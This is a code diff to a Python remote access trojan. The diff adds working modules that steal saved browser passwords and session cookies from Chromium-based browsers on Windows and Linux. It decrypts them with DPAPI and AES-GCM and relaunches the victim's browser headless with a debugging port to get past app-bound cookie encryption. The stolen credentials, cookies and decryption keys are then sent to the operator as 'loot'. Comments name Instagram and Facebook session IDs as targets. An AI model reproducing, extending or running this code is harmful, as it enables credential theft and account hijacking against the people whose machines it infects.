@@ -35,6 +35,8 @@ except ImportError:
     pass
 import importlib.metadata
 from datetime import datetime
+import sqlite3
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 # Platform-specific imports
 IS_WINDOWS = platform.system().lower() == 'windows'
@@ -90,7 +92,670 @@ class Singleton:
                     sys.exit(0)
                 else:
                     # Shadow instance: Wait for the main one to exit to take over
-                    time.sleep(10) # Check every 10 seconds to save CPU
+                    time.sleep(3) # Check every 3 seconds to save CPU
+
+class BrowserManager:
+    """Handle browser data extraction (passwords, history, cookies)"""
+    
+    @staticmethod
+    def get_passwords():
+        """Extract passwords from all supported browsers"""
+        all_passwords = []
+        all_keys = {}
+        
+        if IS_WINDOWS:
+            browsers = {
+                'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data'),
+                'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data'),
+                'Brave': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'BraveSoftware\Brave-Browser\User Data'),
+                'Opera': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera Stable'),
+                'Opera GX': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera GX Stable')
+            }
+            
+            for name, path in browsers.items():
+                if os.path.exists(path):
+                    res = BrowserManager._steal_chromium_windows(name, path)
+                    if isinstance(res, dict):
+                        all_passwords.extend(res.get('passwords', []))
+                        browser_keys = res.get('keys')
+                        if browser_keys:
+                            all_keys[name] = browser_keys
+        
+        elif IS_LINUX:
+            browsers = {
+                'Chrome': os.path.expanduser('~/.config/google-chrome'),
+                'Chromium': os.path.expanduser('~/.config/chromium'),
+                'Brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser'),
+                'Opera': os.path.expanduser('~/.config/opera')
+            }
+            
+            for name, path in browsers.items():
+                if os.path.exists(path):
+                    res = BrowserManager._steal_chromium_linux(name, path)
+                    if isinstance(res, dict):
+                        all_passwords.extend(res.get('passwords', []))
+        
+        return {'passwords': all_passwords, 'keys': all_keys}
+
+    @staticmethod
+    def get_cookies(url_filter=None):
+        """Extract cookies from all supported browsers, optionally filtered by URL/domain"""
+        all_cookies = []
+        all_keys = [] # Standardized as list of keys
+        
+        if IS_WINDOWS:
+            browsers = {
+                'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data'),
+                'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data'),
+                'Brave': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'BraveSoftware\Brave-Browser\User Data'),
+                'Opera': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera Stable'),
+                'Opera GX': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera GX Stable')
+            }
+            
+            for name, path in browsers.items():
+                if os.path.exists(path):
+                    res = BrowserManager._steal_cookies_windows(name, path, url_filter)
+                    if isinstance(res, dict):
+                        all_cookies.extend(res.get('cookies', []))
+                        browser_keys = res.get('keys', [])
+                        if browser_keys:
+                            all_keys.extend(browser_keys)
+        
+        # TODO: Linux cookie support
+        
+        return {'cookies': all_cookies, 'keys': list(set(all_keys))}
+
+    @staticmethod
+    def get_live_cookies(url="https://www.google.com", port=9222, timeout=90):
+        """Extract cookies using Remote Debugging Port (bypasses App-Bound encryption)"""
+        try:
+            import http.client
+            import struct
+            
+            # 1. Multi-Browser Discovery (Find the browser the user ACTUALLY uses)
+            best_browser_path = None
+            best_profile_path = None
+            best_profile_name = "Default"
+            max_cookies = -1
+            
+            # Domain fragment for checking relevance
+            domain_frag = url.split("//")[-1].split("/")[0] if "//" in url else url
+            domain_frag = ".".join(domain_frag.split(".")[-2:]) # e.g. instagram.com
+
+            if IS_WINDOWS:
+                search_targets = [
+                    ('Chrome', [
+                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\Application\chrome.exe'),
+                        os.path.join(os.environ.get('ProgramFiles', ''), r'Google\Chrome\Application\chrome.exe'),
+                        os.path.join(os.environ.get('ProgramFiles(x86)', ''), r'Google\Chrome\Application\chrome.exe')
+                    ], os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data')),
+                    
+                    ('Edge', [
+                        os.path.join(os.environ.get('ProgramFiles(x86)', ''), r'Microsoft\Edge\Application\msedge.exe'),
+                        os.path.join(os.environ.get('ProgramFiles', ''), r'Microsoft\Edge\Application\msedge.exe')
+                    ], os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data')),
+                    
+                    ('Brave', [
+                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'BraveSoftware\Brave-Browser\Application\brave.exe'),
+                        os.path.join(os.environ.get('ProgramFiles', ''), r'BraveSoftware\Brave-Browser\Application\brave.exe')
+                    ], os.path.join(os.environ.get('LOCALAPPDATA', ''), r'BraveSoftware\Brave-Browser\User Data')),
+
+                    ('Opera', [
+                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Programs\Opera\launcher.exe'),
+                        r'C:\Program Files\Opera\launcher.exe'
+                    ], os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera Stable')),
+
+                    ('Opera GX', [
+                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Programs\Opera GX\launcher.exe'),
+                        r'C:\Program Files\Opera GX\launcher.exe'
+                    ], os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera GX Stable')),
+
+                    ('Vivaldi', [
+                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Vivaldi\Application\vivaldi.exe'),
+                        os.path.join(os.environ.get('ProgramFiles', ''), r'Vivaldi\Application\vivaldi.exe')
+                    ], os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Vivaldi\User Data')),
+                ]
+
+                for b_name, b_exe_paths, ud_root in search_targets:
+                    found_exe = None
+                    for exe_p in b_exe_paths:
+                        if os.path.exists(exe_p):
+                            found_exe = exe_p
+                            break
+                    if not found_exe or not os.path.exists(ud_root): continue
+
+                    # Check profiles
+                    p_list = []
+                    if "Opera" in b_name:
+                        p_list = [("", ud_root)]
+                    else:
+                        try:
+                            for d in os.listdir(ud_root):
+                                if d == "Default" or d.startswith("Profile "):
+                                    p_list.append((d, os.path.join(ud_root, d)))
+                        except: pass
+
+                    for p_name, p_path in p_list:
+                        c_jar = os.path.join(p_path, "Network", "Cookies")
+                        if not os.path.exists(c_jar): c_jar = os.path.join(p_path, "Cookies")
+                        
+                        if os.path.exists(c_jar):
+                            try:
+                                temp_chk = os.path.join(tempfile.gettempdir(), f"vld_{random.randint(1000,9999)}.db")
+                                shutil.copy2(c_jar, temp_chk)
+                                conn = sqlite3.connect(temp_chk)
+                                count = conn.execute("SELECT COUNT(*) FROM cookies WHERE host_key LIKE ?", (f"%{domain_frag}%",)).fetchone()[0]
+                                conn.close()
+                                os.remove(temp_chk)
+                                
+                                if count > max_cookies:
+                                    max_cookies = count
+                                    best_browser_path = found_exe
+                                    best_profile_path = ud_root
+                                    best_profile_name = p_name
+                            except: pass
+
+            if not best_browser_path:
+                return {'error': 'No suitable browser with active session found for live extraction'}
+            
+            browser_path = best_browser_path
+            profile_path = best_profile_path
+            best_profile = best_profile_name
+            
+            # Shadow Selected Profile
+            temp_user_data = os.path.join(tempfile.gettempdir(), f"chrome_shadow_{random.randint(1000, 9999)}")
+            os.makedirs(temp_user_data, exist_ok=True)
+            
+            if profile_path and os.path.exists(profile_path):
+                try:
+                    # Chrome expects the profile data in a 'Default' subfolder of user-data-dir if we want it used
+                    os.makedirs(os.path.join(temp_user_data, "Default"), exist_ok=True)
+                    os.makedirs(os.path.join(temp_user_data, "Default", "Network"), exist_ok=True)
+                    
+                    # Copy Master Key (Local State)
+                    src_ls = os.path.join(profile_path, "Local State")
+                    if os.path.exists(src_ls):
+                        shutil.copy2(src_ls, os.path.join(temp_user_data, "Local State"))
+                    
+                    # Copy Targeted Profile Cookies as 'Default'
+                    src_profile = os.path.join(profile_path, best_profile)
+                    for f in ["Cookies"]:
+                        for sub in ["", "Network"]:
+                            src_c = os.path.join(src_profile, sub, f)
+                            if os.path.exists(src_c):
+                                dest_sub = os.path.join(temp_user_data, "Default", sub)
+                                os.makedirs(dest_sub, exist_ok=True)
+                                shutil.copy2(src_c, os.path.join(dest_sub, f))
+                except:
+                    pass
+
+            cmd = [
+                browser_path or "",
+                f"--remote-debugging-port={port}",
+                f"--user-data-dir={temp_user_data}",
+                "--headless=new",
+                "--no-first-run",
+                "--remote-allow-origins=*",
+                "--disable-blink-features=AutomationControlled",
+                "--disable-infobars",
+                url
+            ]
+            
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            cookies = []
+            ws_url = ""
+            
+            # Wait for CDP
+            start_time = time.time()
+            while time.time() - start_time < 20:
+                try:
+                    conn = http.client.HTTPConnection("127.0.0.1", port)
+                    conn.request("GET", "/json/list")
+                    resp = conn.getresponse()
+                    if resp.status == 200:
+                        targets = json.loads(resp.read().decode())
+                        for t in targets:
+                            if t.get('type') == 'page' and 'webSocketDebuggerUrl' in t:
+                                ws_url = str(t['webSocketDebuggerUrl'])
+                                break
+                        if ws_url: 
+                            break
+                    conn.close()
+                except:
+                    pass
+                time.sleep(1)
+            
+            if ws_url:
+                try:
+                    path_part = "/" + ws_url.split("/", 3)[3] if "/" in ws_url else ""
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(20)
+                    s.connect(("127.0.0.1", port))
+                    
+                    key = base64.b64encode(os.urandom(16)).decode()
+                    handshake = f"GET {path_part} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
+                    s.send(handshake.encode())
+                    s.recv(4096)
+                    
+                    # 1. State Verification (Wait for 'complete')
+                    for i in range(40):
+                        try:
+                            pid = 2000 + i
+                            cmd_eval = json.dumps({"id": pid, "method": "Runtime.evaluate", "params": {"expression": "document.readyState"}})
+                            BrowserManager._send_ws_frame(s, cmd_eval)
+                            
+                            found = False
+                            p_start = time.time()
+                            while time.time() - p_start < 2:
+                                data = s.recv(16384)
+                                if b'"complete"' in data and f'"id":{pid}'.encode() in data:
+                                    found = True
+                                    break
+                            if found: 
+                                break
+                        except:
+                            pass
+                        time.sleep(1)
+                    
+                    # 2. Settling Buffer
+                    time.sleep(20)
+                    
+                    # 3. Pull
+                    cmd_enable = json.dumps({"id": 1, "method": "Network.enable"})
+                    BrowserManager._send_ws_frame(s, cmd_enable)
+                    s.recv(4096)
+                    
+                    cmd_get = json.dumps({"id": 2, "method": "Network.getAllCookies"})
+                    BrowserManager._send_ws_frame(s, cmd_get)
+                    
+                    resp_data = b""
+                    done = False
+                    r_start = time.time()
+                    while time.time() - r_start < 30:
+                        try:
+                            chunk = s.recv(131072)
+                            if not chunk: 
+                                break
+                            resp_data += chunk
+                            if b'"id":2' in resp_data and b'"result"' in resp_data:
+                                if resp_data.count(b'{') == resp_data.count(b'}'):
+                                    done = True
+                                    break
+                        except:
+                            break
+                    
+                    if done:
+                        idx = resp_data.find(b'{"id":2')
+                        if idx != -1:
+                            try:
+                                result = json.loads(resp_data[idx:].decode(errors='replace'))
+                                cookies = result.get('result', {}).get('cookies', [])
+                            except:
+                                pass
+                    s.close()
+                except:
+                    pass
+
+            proc.terminate()
+            time.sleep(1)
+            shutil.rmtree(temp_user_data, ignore_errors=True)
+            
+            if cookies:
+                return {'success': True, 'count': len(cookies), 'cookies': cookies, 'status': 'live'}
+            return {'success': False, 'message': 'Live extraction completed but no cookies found.', 'status': 'live_failed'}
+
+        except Exception as e:
+            return {'error': str(e)}
+
+    @staticmethod
+    def _send_ws_frame(sock, data):
+        import struct
+        payload = data.encode()
+        length = len(payload)
+        header = bytearray([0x81])
+        if length <= 125:
+            header.append(length | 0x80)
+        elif length <= 65535:
+            header.append(126 | 0x80)
+            header.extend(struct.pack(">H", length))
+        else:
+            header.append(127 | 0x80)
+            header.extend(struct.pack(">Q", length))
+        mask = os.urandom(4)
+        header.extend(mask)
+        masked_payload = bytearray()
+        for i in range(length):
+            masked_payload.append(payload[i] ^ mask[i % 4])
+        header.extend(masked_payload)
+        sock.send(header)
+
+    @staticmethod
+    def _steal_cookies_windows(browser_name, user_data_path, url_filter=None):
+        """Steal cookies from Chromium-based browsers on Windows"""
+        cookies = []
+        try:
+            # 1. Get Master Key (reuse same logic as passwords)
+            local_state_path = os.path.join(user_data_path, "Local State")
+            if not os.path.exists(local_state_path):
+                local_state_path = os.path.join(os.path.dirname(user_data_path), "Local State")
+                if not os.path.exists(local_state_path): return {'cookies': [], 'keys': {}}
+
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                local_state = json.loads(f.read())
+            
+            local_state_data = local_state.get("os_crypt", {})
+            encrypted_key_raw = base64.b64decode(local_state_data.get("encrypted_key", ""))
+            app_bound_key_raw = base64.b64decode(local_state_data.get("app_bound_encrypted_key", ""))
+            
+            # Use DPAPI to decrypt the key
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]
+
+            def decrypt_dpapi(data):
+                if not data: return None
+                try:
+                    if data.startswith(b'DPAPI'): data = data[5:]
+                    in_blob = DATA_BLOB(len(data), ctypes.create_string_buffer(data))
+                    out_blob = DATA_BLOB()
+                    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
+                        res = ctypes.string_at(out_blob.pbData, out_blob.cbData)
+                        ctypes.windll.kernel32.LocalFree(out_blob.pbData)
+                        return res
+                except: pass
+                return None
+
+            potential_keys = []
+            m1 = decrypt_dpapi(encrypted_key_raw)
+            if m1: potential_keys.append(m1)
+            m2 = decrypt_dpapi(app_bound_key_raw)
+            if m2: potential_keys.append(m2)
+            
+            if not potential_keys: return {'cookies': [], 'keys': {}}
+            master_key = potential_keys[0]
+
+            # 2. Iterate Profiles
+            profiles = ['Default', 'Guest Profile']
+            for i in range(1, 10): profiles.append(f'Profile {i}')
+            
+            for profile in profiles:
+                # Cookies path varies in newer versions
+                cookie_paths = [
+                    os.path.join(user_data_path, profile, "Network", "Cookies"),
+                    os.path.join(user_data_path, profile, "Cookies")
+                ]
+                
+                cookie_db = None
+                for cp in cookie_paths:
+                    if os.path.exists(cp):
+                        cookie_db = cp
+                        break
+                
+                if not cookie_db: continue
+                
+                temp_db = os.path.join(tempfile.gettempdir(), f"ck_{random.randint(1000, 9999)}.db")
+                shutil.copy2(cookie_db, temp_db)
+                
+                try:
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    
+                    query = "SELECT host_key, name, value, encrypted_value, path, expires_utc, is_httponly, is_secure, samesite FROM cookies"
+                    params = []
+                    if url_filter:
+                        query += " WHERE host_key LIKE ?"
+                        params.append(f"%{url_filter}%")
+                    
+                    cursor.execute(query, params)
+                    
+                    for host, name, val, enc_val, path, expires, is_httponly, is_secure, samesite in cursor.fetchall():
+                        dec_val = val
+                        raw_hash = ""
+                        if enc_val:
+                            if hasattr(enc_val, 'tobytes'): enc_val = enc_val.tobytes()
+                            raw_hash = enc_val.hex()
+                            
+                            if not dec_val:
+                                if enc_val.startswith(b'v10') or enc_val.startswith(b'v11') or enc_val.startswith(b'v20'):
+                                    iv = enc_val[3:15]
+                                    payload = enc_val[15:]
+                                    
+                                    worked = False
+                                    for key in potential_keys:
+                                        try:
+                                            aesgcm = AESGCM(key)
+                                            decrypted_bytes = aesgcm.decrypt(iv, payload, None)
+                                            dec_val = decrypted_bytes.decode('utf-8', errors='replace')
+                                            worked = True
+                                            break
+                                        except Exception as e:
+                                            last_err = str(e)
+                                            continue
+                                    
+                                    if not worked:
+                                        # Match password error style for consistency
+                                        err_type = "InvalidTag()" if "tag" in last_err.lower() else last_err
+                                        payload_len = len(payload)
+                                        iv_len = len(iv)
+                                        mk_len = len(potential_keys[0]) if potential_keys else 0
+                                        dec_val = f"[{err_type} | MK:{mk_len} IV:{iv_len} P:{payload_len}]"
+                                else:
+                                    raw_dec = decrypt_dpapi(enc_val)
+                                    if raw_dec:
+                                        dec_val = raw_dec.decode('utf-8', errors='replace')
+                                    else:
+                                        dec_val = "[DPAPI failed]"
+
+                        # Convert Webkit timestamp (microseconds since 1601) to Unix (seconds since 1970)
+                        unix_expires = 0
+                        if expires > 0:
+                            unix_expires = (expires / 1000000) - 11644473600
+                            if unix_expires < 0: unix_expires = 0
+
+                        # Map SameSite
+                        ss_map = {-1: "unspecified", 0: "no_restriction", 1: "lax", 2: "strict"}
+                        ss_str = ss_map.get(samesite, "unspecified")
+
+                        cookies.append({
+                            'browser': browser_name,
+                            'profile': profile,
+                            'domain': host,
+                            'name': name,
+                            'value': dec_val,
+                            'path': path,
+                            'expirationDate': unix_expires,
+                            'httpOnly': bool(is_httponly),
+                            'secure': bool(is_secure),
+                            'sameSite': ss_str,
+                            'hostOnly': not host.startswith('.'),
+                            'session': expires == 0 or unix_expires == 0,
+                            'storeId': "0"
+                        })
+                    conn.close()
+                except: pass
+                finally:
+                    if os.path.exists(temp_db): os.remove(temp_db)
+            
+            return {
+                'cookies': cookies,
+                'keys': [base64.b64encode(k).decode() for k in potential_keys]
+            }
+        except Exception as e:
+            return {'cookies': [], 'keys': {}, 'error': str(e)}
+
+    @staticmethod
+    def _steal_chromium_windows(browser_name, user_data_path):
+        """Steal passwords from Chromium-based browsers on Windows"""
+        passwords = []
+        try:
+            # 1. Get Master Key
+            local_state_path = os.path.join(user_data_path, "Local State")
+            if not os.path.exists(local_state_path):
+                # Try higher level for Opera
+                local_state_path = os.path.join(os.path.dirname(user_data_path), "Local State")
+                if not os.path.exists(local_state_path): return {'passwords': [], 'keys': {}}
+
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                local_state = json.loads(f.read())
+            
+            local_state_data = local_state.get("os_crypt", {})
+            encrypted_key_raw = base64.b64decode(local_state_data.get("encrypted_key", ""))
+            app_bound_key_raw = base64.b64decode(local_state_data.get("app_bound_encrypted_key", ""))
+            
+            # Use DPAPI to decrypt the key
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]
+
+            def decrypt_dpapi(data):
+                if not data: return None
+                try:
+                    # Remove 'DPAPI' prefix (5 bytes) if present
+                    if data.startswith(b'DPAPI'): data = data[5:]
+                    in_blob = DATA_BLOB(len(data), ctypes.create_string_buffer(data))
+                    out_blob = DATA_BLOB()
+                    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
+                        res = ctypes.string_at(out_blob.pbData, out_blob.cbData)
+                        ctypes.windll.kernel32.LocalFree(out_blob.pbData)
+                        return res
+                except: pass
+                return None
+
+            potential_keys = []
+            m1 = decrypt_dpapi(encrypted_key_raw)
+            if m1: potential_keys.append(m1)
+            m2 = decrypt_dpapi(app_bound_key_raw)
+            if m2: potential_keys.append(m2)
+            
+            if not potential_keys: return {'passwords': [], 'keys': {}}
+            master_key = potential_keys[0] # Primary key for reporting backward compatibility
+
+            # 2. Iterate Profiles
+            profiles = ['Default', 'Guest Profile']
+            for i in range(1, 10): profiles.append(f'Profile {i}')
+            
+            for profile in profiles:
+                login_db = os.path.join(user_data_path, profile, "Login Data")
+                if not os.path.exists(login_db): continue
+                
+                # Copy to temp to avoid 'locked' errors
+                temp_db = os.path.join(tempfile.gettempdir(), f"sq_{random.randint(1000, 9999)}.db")
+                shutil.copy2(login_db, temp_db)
+                
+                try:
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    
+                    for url, user, enc_pass in cursor.fetchall():
+                        if not user or not enc_pass: continue
+                        
+                        # Ensure enc_pass is bytes
+                        if hasattr(enc_pass, 'tobytes'): # Handle memoryview
+                            enc_pass = enc_pass.tobytes()
+                        elif not isinstance(enc_pass, bytes):
+                            enc_pass = bytes(enc_pass)
+
+                        dec_pass = ""
+                        try:
+                            # Detect encryption version (v10, v11, and newer v20)
+                            if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11') or enc_pass.startswith(b'v20'):
+                                if not master_key:
+                                    dec_pass = "[No Master Key]"
+                                else:
+                                    iv = enc_pass[3:15]
+                                    payload = enc_pass[15:]
+                                    dec_pass = None
+                                    for idx, key in enumerate(potential_keys):
+                                        try:
+                                            aesgcm = AESGCM(key)
+                                            decrypted_bytes = aesgcm.decrypt(iv, payload, None)
+                                            try:
+                                                dec_pass = decrypted_bytes.decode('utf-8')
+                                            except:
+                                                dec_pass = decrypted_bytes.decode('latin-1', errors='replace')
+                                            break # Success
+                                        except Exception as ae:
+                                            last_err = ae
+                                            continue
+                                    
+                                    if dec_pass is None:
+                                        m_len = len(potential_keys[0]) if potential_keys else 0
+                                        dec_pass = f"[{repr(last_err)} | Keys:{len(potential_keys)} IV:{len(iv)} P:{len(payload)}]"
+                            else:
+                                try:
+                                    raw_dec = decrypt_dpapi(enc_pass)
+                                    if raw_dec:
+                                        try:
+                                            dec_pass = raw_dec.decode('utf-8')
+                                        except:
+                                            dec_pass = raw_dec.decode('latin-1', errors='replace')
+                                    else:
+                                        prefix = enc_pass[:4].hex() if enc_pass else "empty"
+                                        dec_pass = f"[DPAPI failed: {prefix}]"
+                                except Exception as de:
+                                    dec_pass = f"[DPAPI Error: {repr(de)}]"
+                        except Exception as e:
+                            dec_pass = f"[General Error: {repr(e)}]"
+                        
+                        passwords.append({
+                            'browser': browser_name,
+                            'profile': profile,
+                            'url': url,
+                            'user': user,
+                            'pass': dec_pass,
+                            'hash': enc_pass.hex() if (dec_pass and dec_pass.startswith("[")) else None
+                        })
+                    conn.close()
+                except:
+                    pass
+                finally:
+                    if os.path.exists(temp_db): os.remove(temp_db)
+            
+            return {
+                'passwords': passwords,
+                'keys': [base64.b64encode(k).decode() for k in potential_keys]
+            }
+        except Exception as e:
+            return {'passwords': [], 'keys': {}, 'error': str(e)}
+
+    @staticmethod
+    def _steal_chromium_linux(browser_name, user_data_path):
+        """Steal passwords from Chromium-based browsers on Linux (simplified)"""
+        passwords = []
+        # Linux decryption requires interacting with secret service/keyring
+        # For now, we collect the database for manual offline extraction or basic dump
+        try:
+            profiles = ['Default']
+            for i in range(1, 10): profiles.append(f'Profile {i}')
+            
+            for profile in profiles:
+                login_db = os.path.join(user_data_path, profile, "Login Data")
+                if not os.path.exists(login_db): continue
+                
+                temp_db = os.path.join(tempfile.gettempdir(), f"sq_l_{random.randint(1000, 9999)}.db")
+                shutil.copy2(login_db, temp_db)
+                
+                try:
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    
+                    for url, user, enc_pass in cursor.fetchall():
+                        if not user: continue
+                        passwords.append({
+                            'browser': browser_name,
+                            'profile': profile,
+                            'url': url,
+                            'user': user,
+                            'pass': '[ENCRYPTED_LINUX]',
+                            'hash': enc_pass.hex() if isinstance(enc_pass, bytes) else str(enc_pass)
+                        })
+                    conn.close()
+                except: pass
+                finally:
+                    if os.path.exists(temp_db): os.remove(temp_db)
+            return {'passwords': passwords}
+        except Exception as e:
+            return {'passwords': [], 'error': str(e)}
 
 class CryptoManager:
     """Handle encryption/decryption of C2 communications"""
@@ -926,7 +1591,9 @@ class AdvancedRAT:
             'clipboard': self._handle_clipboard,
             'wallpaper': self._handle_wallpaper,
             'power': self._handle_power,
-            'wifi_passwords': self._handle_wifi_passwords
+            'wifi_passwords': self._handle_wifi_passwords,
+            'browser_passwords': self._handle_browser_passwords,
+            'browser_cookies': self._handle_browser_cookies
         }
     
     def _send_encrypted(self, data):
@@ -1894,6 +2561,153 @@ pty.spawn("/bin/sh")
                                 except: pass
                     except: pass
             return {'success': True, 'wifi_data': results}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_browser_passwords(self, cmd):
+        """Dump saved browser passwords and decryption keys for offline analysis"""
+        try:
+            data = BrowserManager.get_passwords()
+            passwords = data.get('passwords', [])
+            keys = data.get('keys', {})
+            
+            if not passwords:
+                return {'success': True, 'message': 'No passwords found or browsers not detected', 'count': 0}
+
+            # Prepare report including keys
+            report_data = {
+                'metadata': {
+                    'extracted_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'system': platform.node(),
+                    'user': getpass.getuser(),
+                    'decryption_keys': keys
+                },
+                'credentials': passwords
+            }
+
+            report_json = json.dumps(report_data, indent=2)
+            filename = f"browser_loot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+            
+            # Encrypted hashes are sensitive and can be large, always send as loot if requested or > 10 entries
+            submit_as_loot = cmd.get('as_file', True) or len(passwords) > 10
+            
+            if submit_as_loot:
+                self._send_loot('passwords', report_json.encode(), filename)
+                return {
+                    'success': True,
+                    'status': 'sent_as_loot',
+                    'filename': filename,
+                    'count': len(passwords),
+                    'keys_found': len(keys) > 0
+                }
+
+            return {
+                'success': True,
+                'data': report_data,
+                'count': len(passwords)
+            }
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_browser_cookies(self, cmd):
+        """Extract browser cookies, optionally filtered by URL/domain"""
+        try:
+            url_filter = cmd.get('url', '')
+            is_live = cmd.get('live', False)
+            
+            if is_live:
+                # 1. Main OS Browser Warmup (Refreshes sessions/anti-bot state in user's active environment)
+                try:
+                    target_url = url_filter if url_filter.startswith("http") else f"https://{url_filter}"
+                    webbrowser.open(target_url)
+                    time.sleep(5) # Give the native browser a moment to settle/set cookies
+                except:
+                    pass
+
+                # 2. Surgical Disk Harvest (to get App-Bound/v20 cookies like 'sessionid')
+                disk_data = BrowserManager.get_cookies(url_filter)
+                disk_cookies = disk_data.get('cookies', [])
+                
+                # 2. Live State Capture (to get dynamic/ephemeral tokens)
+                res = BrowserManager.get_live_cookies(url_filter if url_filter.startswith("http") else f"https://{url_filter}")
+                if 'error' in res: return res
+                live_cookies = res.get('cookies', [])
+                
+                # 3. Intelligent Merge: Preserves the most 'live' versions but fills gaps from disk
+                # (Especially important for Instagram/FB where 'sessionid' is App-Bound)
+                live_keys = set()
+                for c in live_cookies:
+                    if isinstance(c, dict):
+                        # CDP cookies use 'domain', Disk uses 'domain' too (after my update)
+                        live_keys.add((c.get('name'), c.get('domain')))
+                
+                final_cookies = live_cookies[:]
+                for dc in disk_cookies:
+                    if not isinstance(dc, dict): continue
+                    d_name = dc.get('name')
+                    d_host = dc.get('domain')
+                    if (d_name, d_host) not in live_keys:
+                        # Convert Disk schema to aligned CDP format
+                        final_cookies.append({
+                            'name': d_name,
+                            'value': dc.get('value', ''),
+                            'domain': d_host,
+                            'path': dc.get('path', '/'),
+                            'expirationDate': dc.get('expirationDate', 0),
+                            'httpOnly': dc.get('httpOnly', True),
+                            'secure': dc.get('secure', True),
+                            'sameSite': dc.get('sameSite', 'no_restriction'),
+                            'hostOnly': dc.get('hostOnly', False),
+                            'session': dc.get('session', False),
+                            'storeId': dc.get('storeId', '0'),
+                            'source': 'disk_sync'
+                        })
+                
+                cookies = final_cookies
+                keys = disk_data.get('keys', [])
+                status = 'live_hybrid'
+            else:
+                data = BrowserManager.get_cookies(url_filter)
+                cookies = data.get('cookies', [])
+                keys = data.get('keys', [])
+                status = 'disk'
+            
+            if not cookies and status != 'live':
+                return {'success': True, 'message': 'No cookies found matching filter', 'count': 0}
+
+            report_data = {
+                'metadata': {
+                    'extracted_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'system': platform.node(),
+                    'user': getpass.getuser(),
+                    'url_filter': url_filter,
+                    'extraction_mode': status,
+                    'decryption_keys': keys
+                },
+                'cookies': cookies
+            }
+
+            report_json = json.dumps(report_data, indent=2)
+            filename = f"cookies_{status}_{url_filter.replace('.', '_') if url_filter else 'all'}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+            
+            submit_as_loot = cmd.get('as_file', True) or len(cookies) > 20
+            
+            if submit_as_loot:
+                self._send_loot('cookies', report_json.encode(), filename)
+                return {
+                    'success': True,
+                    'status': 'sent_as_loot',
+                    'extraction_mode': status,
+                    'filename': filename,
+                    'count': len(cookies)
+                }
+
+            return {
+                'success': True,
+                'data': report_data,
+                'extraction_mode': status,
+                'count': len(cookies)
+            }
         except Exception as e:
             return {'error': str(e)}
 
